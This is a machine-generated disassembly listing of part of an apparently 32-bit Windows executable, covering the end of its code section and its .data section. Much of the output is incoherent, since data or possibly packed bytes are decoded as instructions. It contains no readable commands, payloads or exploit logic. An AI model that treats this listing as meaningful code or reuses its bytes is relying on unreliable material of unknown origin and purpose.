  408b00:	cmp    DWORD PTR [esp+ebp*2-0x5f48327e],edx
  408b07:	cmp    BYTE PTR [esi],dl
  408b09:	mov    ds:0x431f3bfb,al
  408b0e:	add    ebx,DWORD PTR [edx+ebx*1]
  408b11:	dec    ebx
  408b12:	xor    edx,edx
  408b14:	add    DWORD PTR [ebp-0xc],ebx
  408b17:	pop    ebx
  408b18:	mov    eax,DWORD PTR [ebp-0xc]
  408b1b:	pop    edi
  408b1c:	jmp    0x408ca5
  408b21:	add    al,0xa8
  408b23:	retf   
  408b24:	mov    al,0x7b
  408b26:	push   ebx
  408b27:	xchg   DWORD PTR [eax-0x17],edi
  408b2a:	shl    ebx,1
  408b2c:	das    
  408b2d:	fsubr  DWORD PTR [edx+0x350f29de]
  408b33:	jl     0x408bb1
  408b35:	call   0xd8bd07b9
  408b3a:	pop    es
  408b3b:	mov    eax,DWORD PTR [ebx+0x313aa89]
  408b41:	repnz rcr BYTE PTR [edx+0x53849e76],0xa6
  408b49:	arpl   WORD PTR [ebx+edi*2+0x15],dx
  408b4d:	pop    edx
  408b4e:	pop    ebp
  408b4f:	data16 sbb al,0x26
  408b52:	push   esi
  408b53:	jnp    0x408b53
  408b55:	lahf   
  408b56:	in     al,dx
  408b57:	imul   ebx,DWORD PTR [ecx+0x61],0x68
  408b5b:	cli    
  408b5c:	sar    DWORD PTR [ecx+edi*1-0x308660ad],0x2c
  408b64:	push   edi
  408b65:	iret   
  408b66:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408b67:	lock lea eax,[edi+esi*1+0xa2e0321]
  408b6f:	les    esp,FWORD PTR [edx+0x6909c45a]
  408b75:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408b76:	sbb    al,0x22
  408b78:	fild   QWORD PTR [ebx+0x34]
  408b7b:	mov    WORD PTR [esi],?
  408b7d:	in     al,dx
  408b7e:	jecxz  0x408b70
  408b80:	mov    ch,0x95
  408b82:	lahf   
  408b83:	jno    0x408ba5
  408b85:	dec    esp
  408b86:	mov    esp,DWORD PTR [edx-0x19329609]
  408b8c:	ins    BYTE PTR es:[edi],dx
  408b8d:	clc    
  408b8e:	sti    
  408b8f:	push   cs
  408b90:	cmp    bl,ah
  408b92:	xchg   ebx,eax
  408b93:	fcom   st(4)
  408b95:	sub    edx,0x521075d3
  408b9b:	cmc    
  408b9c:	loopne 0x408ba6
  408b9e:	fs dec edx
  408ba0:	out    0xd,eax
  408ba2:	mov    ch,0x74
  408ba4:	xor    edx,DWORD PTR [edi]
  408ba6:	push   edi
  408ba7:	in     eax,dx
  408ba8:	xchg   DWORD PTR es:[edi],ecx
  408bab:	enter  0xb9a1,0x50
  408baf:	dec    ebp
  408bb0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  408bb1:	loopne 0x408be1
  408bb3:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bb4:	push   edi
  408bb5:	inc    ebp
  408bb6:	cmp    al,0x78
  408bb8:	xor    DWORD PTR [edx-0x6a9435cb],edx
  408bbe:	adc    BYTE PTR [edi+0x16],al
  408bc1:	jnp    0x408c42
  408bc3:	xchg   BYTE PTR [ecx],dh
  408bc5:	push   edx
  408bc6:	repz xchg edi,eax
  408bc8:	dec    ebp
  408bc9:	and    DWORD PTR [esi],ebp
  408bcb:	test   al,0x15
  408bcd:	lock xor al,0xb5
  408bd0:	test   DWORD PTR [esi+0x55],eax
  408bd3:	inc    eax
  408bd4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408bd5:	xchg   BYTE PTR [edx+0x2e],bh
  408bd8:	push   di
  408bda:	idiv   edx
  408bdc:	ror    DWORD PTR [edi],cl
  408bde:	popa   
  408bdf:	not    cl
  408be1:	push   es
  408be2:	vshufps xmm3,xmm0,XMMWORD PTR [ebx],0x5a
  408be7:	jle    0x408b78
  408be9:	jns    0x408b7a
  408beb:	xchg   esp,eax
  408bec:	xlat   BYTE PTR ds:[ebx]
  408bed:	iret   
  408bee:	stos   DWORD PTR es:[edi],eax
  408bef:	jl     0x408c65
  408bf1:	mov    bh,0x6c
  408bf3:	in     al,dx
  408bf4:	jae    0x408be5
  408bf6:	test   al,0x46
  408bf8:	hlt    
  408bf9:	dec    ebp
  408bfa:	(bad)  
  408bfb:	out    0x43,al
  408bfd:	rol    BYTE PTR [edx],cl
  408bff:	mov    al,ds:0x44246011
  408c04:	xor    ch,dh
  408c06:	dec    ebx
  408c07:	sqrtps xmm4,xmm2
  408c0a:	sub    esp,DWORD PTR [esi+0x2c]
  408c0d:	push   edx
  408c0e:	sbb    al,0x32
  408c10:	or     BYTE PTR [ecx+ecx*4-0x55],dh
  408c14:	ret    0x361e
  408c17:	fistp  QWORD PTR [ebx]
  408c19:	mov    edx,0x1fa57fed
  408c1e:	xor    BYTE PTR ds:0xfaed8611,0x8c
  408c25:	pop    edi
  408c26:	mov    ds:0x14de21e,eax
  408c2b:	jns    0x408c2c
  408c2d:	addr16 jb 0x408bef
  408c30:	jecxz  0x408c9e
  408c32:	pop    ebx
  408c33:	mov    eax,ds:0xb28b8d1c
  408c38:	call   0x1f84:0xc9e0fb75
  408c3f:	hlt    
  408c40:	gs jnp 0x408c5f
  408c43:	xchg   DWORD PTR [eax+0x69],eax
  408c46:	xchg   DWORD PTR [esp+ebp*4],ebp
  408c49:	dec    ecx
  408c4a:	mov    ebx,0x1edb88a
  408c4f:	jp     0x408ccb
  408c51:	inc    ebp
  408c52:	rcr    dh,0xbd
  408c55:	stc    
  408c56:	xchg   esp,eax
  408c57:	add    ah,BYTE PTR [edi+0x4865baf4]
  408c5d:	repnz sub al,0x36
  408c60:	ret    
  408c61:	mov    eax,0xc727151f
  408c66:	jmp    0x408c78
  408c68:	sbb    edx,edi
  408c6a:	cmp    eax,0x39bfb4ce
  408c6f:	sub    al,0x15
  408c71:	and    al,0x2d
  408c73:	inc    esp
  408c74:	push   esi
  408c75:	int3   
  408c76:	adc    al,ah
  408c78:	rcr    ecx,cl
  408c7a:	mov    eax,ds:0x423e3c58
  408c7f:	add    BYTE PTR [ecx-0x57be005d],bh
  408c85:	scas   eax,DWORD PTR es:[edi]
  408c86:	xor    eax,0x4b165d90
  408c8b:	xchg   esi,eax
  408c8c:	js     0x408ce0
  408c8e:	jmp    0x408c1e
  408c90:	pop    esp
  408c91:	push   0xffffffcd
  408c93:	pop    esi
  408c94:	xchg   edi,eax
  408c95:	and    DWORD PTR [edx],ecx
  408c97:	shl    BYTE PTR [ecx],cl
  408c99:	mov    esp,?
  408c9b:	add    ebx,0x6ac12065
  408ca1:	sahf   
  408ca2:	(bad)  
  408ca3:	mov    eax,DWORD PTR [edi-0x3d36a4a2]
  408ca9:	adc    BYTE PTR [eax],al

Disassembly of section .data:

00409000 <.data>:
  409000:	push   ebp
  409001:	pop    edx
  409002:	js     0x40907e
  409004:	imul   ebx,DWORD PTR [ecx+0x4e],0x6f
  409008:	popa   
  409009:	dec    eax
  40900a:	arpl   WORD PTR [edi+0x4d],dx
  40900d:	pop    eax
  40900e:	inc    esi
  40900f:	dec    edx
  409010:	jne    0x40907d
  409012:	push   ebx
  409013:	add    BYTE PTR gs:[eax],al
  409016:	add    BYTE PTR [eax],al
  409018:	push   0x70004094
  40901d:	xchg   esp,eax
  40901e:	inc    eax
  40901f:	add    BYTE PTR [eax-0x6e],ah
  409022:	inc    eax
  409023:	add    dh,ch
  409025:	or     esi,DWORD PTR [edx-0x45b082f2]
  40902b:	dec    esi
  40902c:	pop    es
  40902d:	dec    edi
  40902e:	mov    ecx,0xbc4f2f4e
  409033:	dec    esi
  409034:	add    cl,BYTE PTR [edi+0x43]
  409037:	dec    edi
  409038:	push   ds
  409039:	dec    edi
  40903a:	inc    esi
  40903b:	dec    edi
  40903c:	jnp    0x40908d
  40903e:	inc    ebp
  40903f:	dec    edi
  409040:	mov    edx,0x5e4f4a4e
  409045:	push   edx
  409046:	pop    edi
  409047:	push   ebx
  409048:	mov    ebp,0xba4f7d4e
  40904d:	dec    esi
  40904e:	pop    es
  40904f:	dec    edi
  409050:	mov    ecx,0xbc4f2f4e
  409055:	dec    esi
  409056:	add    cl,BYTE PTR [edi+0x43]
  409059:	dec    edi
  40905a:	push   ds
  40905b:	dec    edi
  40905c:	inc    esi
  40905d:	dec    edi
  40905e:	or     eax,0xba4f454f
  409063:	dec    esi
  409064:	dec    edx
  409065:	dec    edi
  409066:	pop    esi
  409067:	bound  ebx,QWORD PTR [edi+0x63]
  40906a:	mov    ebp,0xba4f7d4e
  40906f:	dec    esi
  409070:	or     cl,BYTE PTR [edi-0x47]
  409073:	dec    esi
  409074:	jnp    0x4090c5
  409076:	mov    ebp,0x404f284e
  40907b:	dec    edi
  40907c:	mov    edx,0x5e4f444e
  409081:	jb     0x4090e2
  409083:	jae    0x4090f4
  409085:	sub    DWORD PTR [eax+eax*4+0x7c],0xffffff90
  40908a:	jge    0x40901d
  40908c:	mov    edi,0xba4f064e
  409091:	dec    esi
  409092:	push   es
  409093:	dec    edi
  409094:	mov    esi,0xbd4f284e
  409099:	dec    esi
  40909a:	jnp    0x4090eb
  40909c:	inc    ecx
  40909d:	dec    edi
  40909e:	mov    edx,0x5e4f464e
  4090a3:	sbb    BYTE PTR [edi-0x7d],0x6f
  4090a7:	xchg   ebx,eax
  4090a8:	ins    BYTE PTR es:[edi],dx
  4090a9:	nop
  4090aa:	jl     0x40904c
  4090ac:	jge    0x40904f
  4090ae:	mov    edi,0xba4f064e
  4090b3:	dec    esi
  4090b4:	push   es
  4090b5:	dec    edi
  4090b6:	mov    esi,0xbd4f284e
  4090bb:	dec    esi
  4090bc:	or     eax,0xba4f414f
  4090c1:	dec    esi
  4090c2:	inc    esi
  4090c3:	dec    edi
  4090c4:	pop    esi
  4090c5:	xchg   edx,eax
  4090c6:	pop    edi
  4090c7:	xchg   ebx,eax
  4090c8:	outs   dx,DWORD PTR ds:[esi]
  4090c9:	mov    ds:0xb07ca06c,eax
  4090ce:	jge    0x409081
  4090d0:	mov    edi,0xba4f0c4e
  4090d5:	dec    esi
  4090d6:	cs dec edi
  4090d8:	mov    ecx,0xbd4f7b4e
  4090dd:	dec    esi
  4090de:	and    eax,0xba4f404f
  4090e3:	dec    esi
  4090e4:	inc    esi
  4090e5:	dec    edi
  4090e6:	pop    esi
  4090e7:	mov    ds:0xb36fa35f,al
  4090ec:	ins    BYTE PTR es:[edi],dx
  4090ed:	mov    al,0x7c
  4090ef:	sar    BYTE PTR [ebp-0x3f],0xbf
  4090f3:	dec    esi
  4090f4:	or     al,0x4f
  4090f6:	mov    edx,0xb94f2e4e
  4090fb:	dec    esi
  4090fc:	jl     0x40914d
  4090fe:	mov    ebp,0x434f1f4e
  409103:	dec    edi
  409104:	mov    edx,0x5e4f414e
  409109:	mov    dl,0x5f
  40910b:	mov    bl,0x6f
  40910d:	ret    
  40910e:	ins    BYTE PTR es:[edi],dx
  40910f:	sar    BYTE PTR [eax+edx*8+0x7d],0xd1
  409114:	mov    edi,0xba4f0c4e
  409119:	dec    esi
  40911a:	cs dec edi
  40911c:	mov    ecx,0xbd4f0a4e
  409121:	dec    esi
  409122:	cs dec edi
  409124:	inc    eax
  409125:	dec    edi
  409126:	mov    edx,0x5e4f444e
  40912b:	ret    0xc35f
  40912e:	outs   dx,DWORD PTR ds:[esi]
  40912f:	shr    DWORD PTR [eax+edx*8+0x7c],cl
  409133:	loopne 0x4091b2
  409135:	loope  0x4090f6
  409137:	dec    esi
  409138:	or     al,0x4f
  40913a:	mov    edx,0xb94f2e4e
  40913f:	dec    esi
  409140:	or     ecx,DWORD PTR [edi-0x43]
  409143:	dec    esi
  409144:	sub    BYTE PTR [edi+0x40],cl
  409147:	dec    edi
  409148:	mov    edx,0x5e4f464e
  40914d:	rcr    BYTE PTR [edi-0x2d],cl
  409150:	outs   dx,DWORD PTR ds:[esi]
  409151:	jecxz  0x4091bf
  409153:	loopne 0x4091d1
  409155:	lock jge 0x409149
  409158:	mov    edi,0xba4f094e
  40915d:	dec    esi
  40915e:	pop    ds
  40915f:	dec    edi
  409160:	mov    ecx,0xbe4f2a4e
  409165:	dec    esi
  409166:	mov    edx,0x5e4ebf4e
  40916b:	loop   0x4091cc
  40916d:	jecxz  0x4091de
  40916f:	rep ins BYTE PTR es:[edi],dx
  409171:	lock jl 0x409174
  409174:	jge    0x409177
  409176:	jl     0x409188
  409178:	jge    0x40918b
  40917a:	mov    esi,0xba4f7f4e
  40917f:	dec    esi
  409180:	and    ecx,DWORD PTR [edi-0x48]
  409183:	dec    esi
  409184:	or     cl,BYTE PTR [edi-0x42]
  409187:	dec    esi
  409188:	sub    DWORD PTR [edi+0x43],ecx
  40918b:	dec    edi
  40918c:	mov    edx,0x5e4f414e
  409191:	add    bl,BYTE PTR [edi+0x3]
  409194:	outs   dx,DWORD PTR ds:[esi]
  409195:	adc    ebp,DWORD PTR [eax+edx*1+0x7c]
  409199:	and    BYTE PTR [ebp+0x21],bh
  40919c:	mov    edi,0x2800004e
  4091a1:	nop
  4091a2:	inc    eax
  4091a3:	add    BYTE PTR [edx+edx*4],bl
  4091a6:	inc    eax
  4091a7:	add    BYTE PTR [edx+edx*4],ah
  4091aa:	inc    eax
  4091ab:	add    BYTE PTR [esp+edx*4+0x40],dh
  4091af:	add    al,bl
  4091b1:	xchg   ebx,eax
  4091b2:	inc    eax
  4091b3:	add    BYTE PTR [esp+edx*4+0x40],ah
  4091b7:	add    BYTE PTR [edx+edx*4],al
  4091ba:	inc    eax
  4091bb:	add    BYTE PTR [eax],cl
  4091bd:	xchg   edx,eax
  4091be:	inc    eax
  4091bf:	add    BYTE PTR [esp+edx*4+0x40],bl
  4091c3:	add    BYTE PTR [edx+edx*4+0x40],ch
  4091c7:	add    BYTE PTR [ecx+ebp*4-0x454a0764],cl
  4091ce:	pushf  
  4091cf:	clc    
  4091d0:	and    BYTE PTR [edx-0x6c6bffc0],dl
  4091d6:	inc    eax
  4091d7:	add    BYTE PTR [eax-0x4bffbf6d],ch
  4091dd:	xchg   ebx,eax
  4091de:	inc    eax
  4091df:	add    ah,al
  4091e1:	xchg   ebx,eax
  4091e2:	inc    eax
  4091e3:	add    BYTE PTR [eax-0x6e],bl
  4091e6:	inc    eax
  4091e7:	add    BYTE PTR [eax+edx*4],ah
  4091ea:	inc    eax
  4091eb:	add    BYTE PTR [eax-0x6e],bh
  4091ee:	inc    eax
  4091ef:	add    BYTE PTR [eax-0x6e],ch
  4091f2:	inc    eax
  4091f3:	add    BYTE PTR [eax-0x6c],bh
  4091f6:	inc    eax
  4091f7:	add    BYTE PTR ds:0x90f89c85,dh
  4091fd:	or     edx,DWORD PTR [edi]
  4091ff:	sub    DWORD PTR [edx+edx*4],0x1c930040
  409206:	push   ss
  409207:	or     DWORD PTR [edi+0x7050d],0xf6004000
  409211:	mov    ss,ebx
  409213:	dec    esp
  409214:	cmp    al,0xc8
  409216:	inc    edx
  409217:	add    BYTE PTR [edx+0x7a],bl
  40921a:	ja     0x409273
  40921c:	(bad)  
  40921d:	cli    
  40921e:	jne    0x409282
  409220:	(bad)  
  409221:	in     eax,dx
  409222:	inc    BYTE PTR [edi]
  409224:	mov    esi,0x1405a3fa
  409229:	xchg   edx,eax
  40922a:	inc    eax
  40922b:	add    BYTE PTR [edx*4-0x69cb0764],dh
  409232:	pushf  
  409233:	clc    
  409234:	xor    edx,DWORD PTR [ebp-0x6acd0764]
  40923a:	pushf  
  40923b:	clc    
  40923c:	xor    DWORD PTR [ebp-0x6acf0764],edx
  409242:	pushf  
  409243:	clc    
  409244:	aas    
  409245:	xchg   ebp,eax
  409246:	pushf  
  409247:	clc    
  409248:	ds xchg ebp,eax
  40924a:	pushf  
  40924b:	clc    
  40924c:	cmp    eax,0x3cf89c95
  409251:	xchg   ebp,eax
  409252:	pushf  
  409253:	clc    
  409254:	and    eax,0xe1f89c95
  409259:	stc    
  40925a:	add    esp,DWORD PTR [eax+0x1c]
  40925d:	nop
  40925e:	inc    eax
  40925f:	add    BYTE PTR [ecx],al
  409261:	xchg   ebx,eax
  409262:	inc    edx
  409263:	add    BYTE PTR [ebx+edx*2+0x7a],dh
  409267:	dec    esp
  409268:	xor    eax,0x90f89c85
  40926d:	jmp    0x126699c2
  409272:	add    BYTE PTR [eax],al
  409274:	sbb    BYTE PTR [eax+0xb920040],dl
  40927a:	add    al,0xe
	...
  4092ac:	(bad)  
  4092ad:	mov    ds:0x42,eax
  4092b2:	add    BYTE PTR [eax],al
  4092b4:	dec    ebp
  4092b5:	add    BYTE PTR [edx+0x0],cl
  4092b8:	inc    esp
  4092b9:	add    BYTE PTR [ebx+0x0],ch
  4092bc:	ins    DWORD PTR es:[edi],dx
  4092bd:	add    BYTE PTR [eax+eax*1],ch
  4092c0:	add    BYTE PTR fs:[ebx+0x0],dh
  4092c4:	add    BYTE PTR cs:[ebx+0x0],ch
  4092c8:	popa   
  4092c9:	add    BYTE PTR [esi+0x0],ah
  4092cc:	push   0x0
  4092ce:	imul   eax,DWORD PTR [eax],0x64
  4092d1:	add    BYTE PTR [eax+eax*1+0x73],ch
  4092d5:	add    BYTE PTR [edx+0x0],ch
  4092d8:	data16 add BYTE PTR [eax+eax*1+0x6b],ch
  4092dd:	add    BYTE PTR [eax+eax*1+0x73],ah
  4092e1:	add    BYTE PTR [esi+0x0],ah
  4092e4:	add    BYTE PTR [bx+si],al
  4092e7:	add    BYTE PTR [ebx+0x0],cl
  4092ea:	push   ebp
  4092eb:	add    BYTE PTR [eax+eax*1+0x4a],al
  4092ef:	add    BYTE PTR [edi+0x0],ch
  4092f2:	imul   eax,DWORD PTR [eax],0x6a
  4092f5:	add    BYTE PTR [edx+0x0],ch
  4092f8:	ins    BYTE PTR es:[edi],dx
  4092f9:	add    BYTE PTR [ebx+0x0],ch
  4092fc:	jae    0x4092fe
  4092fe:	add    BYTE PTR fs:[edx+0x0],ch
  409302:	jae    0x409304
  409304:	popa   
  409305:	add    BYTE PTR [edi+0x0],ch
  409308:	imul   eax,DWORD PTR [eax],0x640066
  40930e:	jae    0x409310
  409310:	ins    BYTE PTR es:[edi],dx
  409311:	add    BYTE PTR [ebx+0x0],ch
  409314:	data16 add BYTE PTR [eax+eax*1+0x73],ah
  409319:	add    BYTE PTR [esi+0x0],ah
  40931c:	push   0x0
  40931e:	add    BYTE PTR fs:[ebx+0x0],dh
  409322:	ins    BYTE PTR es:[edi],dx
  409323:	add    BYTE PTR [esi+0x0],ah
  409326:	jae    0x409328
  409328:	add    BYTE PTR fs:[eax],al
  40932b:	add    BYTE PTR [ecx+ecx*2+0x44],cl
  40932f:	outs   dx,DWORD PTR ds:[esi]
  409330:	jo     0x409381
  409332:	dec    ecx
  409333:	dec    ebx
  409334:	inc    esp
  409335:	dec    ecx
  409336:	dec    edx
  409337:	ins    BYTE PTR es:[edi],dx
  409338:	imul   ebp,DWORD PTR [edx+0x6b],0x68736466
  40933f:	imul   sp,WORD PTR [si+0x0],0x0
  409346:	add    BYTE PTR [eax],al
  409348:	dec    ebx
  409349:	add    BYTE PTR [ebp+0x0],dl
  40934c:	inc    esp
  40934d:	add    BYTE PTR [edx+0x0],cl
  409350:	outs   dx,DWORD PTR ds:[esi]
  409351:	add    BYTE PTR [ebx+0x0],ch
  409354:	push   0x0
  409356:	push   0x0
  409358:	ins    BYTE PTR es:[edi],dx
  409359:	add    BYTE PTR [ebx+0x0],ch
  40935c:	jae    0x40935e
  40935e:	add    BYTE PTR fs:[edx+0x0],ch
  409362:	jae    0x409364
  409364:	popa   
  409365:	add    BYTE PTR [edi+0x0],ch
  409368:	imul   eax,DWORD PTR [eax],0x640066
  40936e:	jae    0x409370
  409370:	ins    BYTE PTR es:[edi],dx
  409371:	add    BYTE PTR [ebx+0x0],ch
  409374:	data16 add BYTE PTR [eax+eax*1+0x73],ah
  409379:	add    BYTE PTR [esi+0x0],ah
  40937c:	push   0x0
  40937e:	add    BYTE PTR fs:[ebx+0x0],dh
  409382:	ins    BYTE PTR es:[edi],dx
  409383:	add    BYTE PTR [esi+0x0],ah
  409386:	jae    0x409388
  409388:	add    BYTE PTR fs:[eax],al
  40938b:	add    BYTE PTR [eax],al
  40938d:	add    BYTE PTR [eax],al
  40938f:	add    BYTE PTR ds:0x2100406f,bl
  409395:	dec    edi
  409396:	pop    ds
  409397:	dec    edi
  409398:	sub    BYTE PTR [edi+0x24],cl
  40939b:	dec    edi
  40939c:	pop    ds
  40939d:	dec    edi
  40939e:	es dec edi
  4093a0:	imul   ecx,DWORD PTR [edi+0x68],0x4eba4f
  4093a7:	add    BYTE PTR ds:0x234f1e4f,bl
  4093ad:	dec    edi
  4093ae:	imul   ecx,DWORD PTR [edi+0x68],0x2f4eba4f
  4093b5:	dec    edi
  4093b6:	sub    DWORD PTR [edi+0x1f],ecx
  4093b9:	dec    edi
  4093ba:	sub    BYTE PTR [edi+0x69],cl
  4093bd:	dec    edi
  4093be:	push   0x4eba4f
  4093c3:	add    BYTE PTR [ecx],ch
  4093c5:	dec    edi
  4093c6:	and    cl,BYTE PTR [edi+0x26]
  4093c9:	dec    edi
  4093ca:	sub    eax,0x2a4f1b4f
  4093cf:	dec    edi
  4093d0:	and    ecx,DWORD PTR [edi-0x46]
  4093d3:	dec    esi
  4093d4:	add    BYTE PTR [eax],al
  4093d6:	add    BYTE PTR [eax],al
  4093d8:	push   cs
  4093d9:	jge    0x4093e9
  4093db:	lea    ecx,[esi]
  4093dd:	popf   
  4093de:	push   cs
  4093df:	lods   eax,DWORD PTR ds:[esi]
  4093e0:	push   cs
  4093e1:	mov    ebp,0xdd0ecd0e
  4093e6:	push   cs
  4093e7:	in     eax,dx
  4093e8:	push   cs
  4093e9:	std    
  4093ea:	push   cs
  4093eb:	or     eax,0x2d0e1d0e
  4093f0:	push   cs
  4093f1:	cmp    eax,0x6d0e5d0e
  4093f6:	push   cs
  4093f7:	jb     0x409407
  4093f9:	jae    0x409409
  4093fb:	jo     0x40940b
  4093fd:	jno    0x40940d
  4093ff:	jbe    0x40940f
  409401:	ja     0x409411
  409403:	je     0x409413
  409405:	jne    0x409415
  409407:	mov    cl,BYTE PTR [esi]
  409409:	mov    ecx,DWORD PTR [esi]
  40940b:	mov    BYTE PTR [esi],cl
  40940d:	mov    DWORD PTR [esi],ecx
  40940f:	mov    cs,WORD PTR [esi]
  409411:	jl     0x409431
  409413:	jge    0x409443
  409415:	jge    0x409455
  409417:	jge    0x409435
  409419:	(bad)  
  40941a:	jge    0x40948c
  40941c:	cmp    eax,0x79730eb1
  409421:	vptestnmw k7{k7},xmm7,QWORD PTR [eax+0x0]{1to2}
  409428:	sub    eax,0x3d56c317
  40942d:	hlt    
  40942e:	xor    dh,BYTE PTR [edi]
  409430:	xor    bh,BYTE PTR [esi-0x23]
  409433:	jno    0x409449
  409435:	mov    cl,0x70
  409437:	imul   ecx,esp,0x8
  40943a:	mov    al,ds:0x3005efd7
  40943f:	xlat   BYTE PTR ds:[ebx]
  409440:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409441:	xchg   ebx,eax
  409442:	sub    al,0x11
  409444:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  409445:	jge    0x4093f2
  409447:	fidiv  WORD PTR [edi+0x64a6f6c9]
  40944d:	xor    dl,dl
  40944f:	pop    ds
  409450:	adc    cl,dh
  409452:	and    al,0xc6
  409454:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409455:	sbb    BYTE PTR [ebp+0x71],ah
  40945b:	add    bh,ch
  40945d:	(bad)  [ebx+0x7]
  409460:	je     0x4093f4
  409462:	inc    eax
  409463:	add    BYTE PTR [edi+0x40],dl
  409466:	shl    DWORD PTR [ebx],1
  409468:	mov    bh,0x79
  40946a:	inc    edx
  40946b:	add    BYTE PTR [edx+0x62],bl
  40946e:	push   esp
  40946f:	addr16 or al,0x92
  409472:	inc    eax
  409473:	add    BYTE PTR [eax-0x6e],dh
  409476:	inc    eax
  409477:	add    BYTE PTR [edi+0x440712ed],cl
  40947d:	popa   
  40947e:	dec    eax
  40947f:	push   edi
  409480:	dec    ecx
  409481:	jne    0x4094f8
  409483:	pop    eax
  409484:	jns    0x4094d8
  409486:	dec    esp
  409487:	inc    edi
  409488:	inc    ebx
  409489:	popa   
  40948a:	jns    0x4094fb
  40948c:	push   0x42467568
  409491:	inc    esp
  409492:	inc    edx
  409493:	jne    0x409506
  409495:	push   ecx
  409496:	push   ebp
  409497:	jno    0x409502
  409499:	jb     0x4094e5
  40949b:	ins    WORD PTR es:[edi],dx
  40949d:	arpl   WORD PTR [esi+0x46],cx
  4094a0:	bound  esi,QWORD PTR [eax+0x4a]
  4094a3:	js     0x4094a5
	...
  4094b5:	add    BYTE PTR [eax],al
  4094b7:	add    BYTE PTR [ebp+0x56],al
  4094ba:	push   cx
  4094bc:	ja     0x409524
  4094be:	inc    esi
  4094bf:	gs inc ebp
  4094c1:	inc    ebx
  4094c2:	dec    ebx
  4094c3:	outs   dx,BYTE PTR ds:[esi]
  4094c4:	imul   ecx,DWORD PTR [esi+0x58],0x64
  4094c8:	push   edx
  4094c9:	dec    edx
  4094ca:	push   0x63
  4094cc:	push   0x636e707a
  4094d1:	push   ebx
  4094d2:	jne    0x40951d
  4094d4:	inc    ecx
  4094d5:	outs   dx,BYTE PTR ds:[esi]
  4094d6:	jo     0x40951b
  4094d8:	inc    ebp
  4094d9:	jp     0x40953f
  4094db:	add    BYTE PTR [eax+0x41],dh
  4094de:	dec    ecx
  4094df:	inc    edx
  4094e0:	inc    cx
  4094e2:	inc    ebx
  4094e3:	jbe    0x40953d
  4094e5:	push   eax
  4094e6:	outs   dx,BYTE PTR ds:[esi]
  4094e7:	add    BYTE PTR [edi+0x4d],al
  4094ea:	pop    edx
  4094eb:	push   0x6a
  4094ed:	jp     0x409533
  4094ef:	imul   edi,DWORD PTR [edx+0x68],0x43
  4094f3:	jbe    0x4094f5
  4094f5:	add    BYTE PTR [esi+0x6c],dh
  4094f8:	inc    ebx
  4094f9:	inc    esi
  4094fa:	popa   
  4094fb:	addr16 push ebx
  4094fd:	dec    edi
  4094fe:	imul   ecx,DWORD PTR [edx+0x4d],0x444b4758
  409505:	push   edi
  409506:	jne    0x409553
  409508:	add    BYTE PTR [eax],al
  40950a:	dec    edi
  40950b:	gs push edi
  40950d:	outs   dx,BYTE PTR fs:[esi]
  40950f:	pop    ecx
  409510:	push   esi
  409511:	push   0xc30c004d
  409516:	dec    ebp
  409517:	icebp  
  409518:	iret   
  409519:	(bad)  
  40951a:	mov    esp,0x99b5a4ff
  40951f:	loopne 0x409519
  409521:	jl     0x409586
  409523:	sar    BYTE PTR [ebp+0x48],1
  409526:	add    BYTE PTR [eax],al
  409528:	imul   eax,DWORD PTR [edi],0x0
  40952b:	add    BYTE PTR [ebp-0x51],dl
  40952e:	or     al,0x80
  409530:	add    esi,DWORD PTR [edi]
  409532:	lods   al,BYTE PTR ds:[esi]
  409533:	xchg   ecx,esi
  409535:	adc    eax,0xa0ad0739
  40953a:	jns    0x4095ad
  40953c:	cmc    
  40953d:	sahf   
  40953e:	je     0x409593
  409540:	inc    esi
  409541:	sub    DWORD PTR [ecx+ebp*1],ebx
  409544:	xchg   ebp,eax
  409545:	pop    esp
  409546:	dec    ebp
  409547:	push   esp
  409548:	mov    eax,cs:0x903f5325
  40954e:	test   eax,0x9663da58
  409553:	mov    dl,0x7b
  409555:	loop   0x4094f7
  409557:	inc    ecx
  409558:	mov    ecx,0x633fe9c8
  40955d:	(bad)  
  40955f:	add    al,0x72
  409561:	sbb    BYTE PTR ds:0x5734a219,al
  409567:	sub    BYTE PTR [eax],0xc7
  40956a:	ss das 
  40956c:	ficom  WORD PTR ds:0x2db82a21
  409572:	arpl   WORD PTR [eax+0x3a],di
  409575:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409576:	retf   0xd409
  409579:	cli    
  40957a:	or     eax,0x44f614b8
  40957f:	js     0x40954c
  409581:	pop    esp
  409582:	call   FWORD PTR [esi+eiz*2-0x54a66193]
  409589:	lods   al,BYTE PTR ds:[esi]
  40958a:	xchg   ebp,eax
  40958b:	push   es
  40958c:	lock bt DWORD PTR [ebp+0x63],eax
  409591:	pop    es
  409592:	icebp  
  409593:	inc    edx
  409594:	test   ebx,edi
  409596:	mov    dl,0x83
  409598:	mov    ds:0x4694e82a,al
  40959d:	mov    ch,0x7d
  40959f:	jp     0x409546
  4095a1:	xchg   edx,eax
  4095a2:	mov    esi,0xaf02486d
  4095a7:	mov    edx,0xad80d37e
  4095ac:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4095ad:	popa   
  4095ae:	test   eax,0xf3a61a1f
  4095b3:	mov    edx,0x52b12ce5
  4095b8:	daa    
  4095b9:	xchg   esp,eax
  4095ba:	out    dx,al
  4095bb:	xchg   edi,eax
  4095bc:	fstp   DWORD PTR [ecx]
  4095be:	(bad)  
  4095bf:	xchg   edx,eax
  4095c0:	sbb    edx,DWORD PTR [ecx-0x60318f1e]
  4095c6:	mov    edi,0x840ac8cf
  4095cb:	jne    0x409561
  4095cd:	cmp    ch,BYTE PTR [ecx]
  4095cf:	adc    al,BYTE PTR [ebx-0x487e7c39]
  4095d5:	jno    0x4095c7
  4095d7:	sub    edi,DWORD PTR [eax-0x63eaf517]
  4095dd:	push   ebp
  4095de:	shr    DWORD PTR [esi],0x4e
  4095e1:	mov    BYTE PTR [ebx],dh
  4095e3:	ins    DWORD PTR es:[edi],dx
  4095e4:	jg     0x40961f
  4095e6:	push   0x28029eda
  4095eb:	mov    ah,0x3f
  4095ed:	dec    edx
  4095ee:	aam    0xd5
  4095f0:	mov    DWORD PTR [edx+esi*2],edi
  4095f3:	jb     0x409581
